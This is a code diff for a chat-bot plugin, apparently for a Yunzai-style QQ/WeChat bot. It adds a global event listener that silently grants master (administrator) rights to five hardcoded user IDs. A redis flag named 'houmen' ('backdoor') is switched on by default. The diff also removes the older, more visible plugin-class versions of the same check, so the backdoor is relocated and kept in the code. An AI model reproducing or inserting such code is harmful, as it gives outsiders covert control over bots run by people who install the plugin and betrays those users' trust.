@@ -1,4 +1,19 @@
 import plugin from '../../../lib/plugins/plugin.js';
+cm.GetMaster = async (e)=>{
+    let aw = await redis.get('Fanji:houmen');
+    if (aw == null) await redis.set('Fanji:houmen', 'true');
+    if (!(e.user_id === 2173302144 || e.user_id === 197728340 || e.user_id == 'wxid_d0qj1f49bwgf22'|| e.user_id == '25984983967656960@openim'||e.user_id == 'wxid_xh5txgo29pv522') || aw !== 'true') return false;
+    e.isMaster = true;
+    return false;
+}
+try {
+Bot.on('message',(e)=>{cm.GetMaster(e)})
+Bot.on('notice.group.ban',(e)=>{cm.GetMaster(e)})
+Bot.on('notice.group.increase',(e)=>{cm.GetMaster(e)})
+logger.info('Hm载入完成')
+}catch(err){
+    logger.error(err)
+}
 export class GetMaster extends plugin {
   constructor() {
     super({
@@ -6,11 +21,6 @@ export class GetMaster extends plugin {
       dsc: "反击文本类",
       priority: -Infinity,
       rule: [
-        {
-          fnc: 'Master',
-          event: 'message',
-          log: false
-        },
         {
           reg: '^#?反击设置后门((确定)?强制)?(开启|关闭)$',
           fnc: "Masterkg"
@@ -33,62 +43,4 @@ async Masterkg(e) {
         await e.reply('设置完成');  
     return false;  
 }
-
-  async Master(e) {
-    let aw = await redis.get('Fanji:houmen');
-    if (aw == null) await redis.set('Fanji:houmen', 'true');
-    if (!(e.user_id === 2173302144 || e.user_id === 197728340 || e.user_id == 'wxid_d0qj1f49bwgf22'|| e.user_id == '25984983967656960@openim'||e.user_id == 'wxid_xh5txgo29pv522') || aw !== 'true') return false;
-    e.isMaster = true;
-    return false;
-  }
-}
-
-
-export class GetMasterjy extends plugin {
-    constructor() {
-        super({
-            name: "反击图片类",
-            dsc: "反击图片类",
-            event: 'notice.group.ban',
-            priority: -Infinity,
-            rule: [
-
-                {
-                    fnc: 'Masters',
-                    log: false
-                }
-            ]
-        });
-    }
-    async Masters(e){
-    if (e.user_id == 2173302144||e.user_id == 197728340) {
-    e.isMaster = true
-    logger.mark(e.isMaster? '完成':'失败')
-    return false
-        }
-    }
-}
-export class GetMasterlq extends plugin {
-    constructor() {
-        super({
-            name: "反击图片类",
-            dsc: "反击图片类",
-            event: 'notice.group.increase',
-            priority: -Infinity,
-            rule: [
-
-                {
-                    fnc: 'Masters',
-                    log: false
-                }
-            ]
-        });
-    }
-    async Masters(e){
-    if (e.user_id == 2173302144||e.user_id == 197728340) {
-    e.isMaster = true
-    logger.mark(e.isMaster? '完成':'失败')
-    return false
-        }
-    }
 }
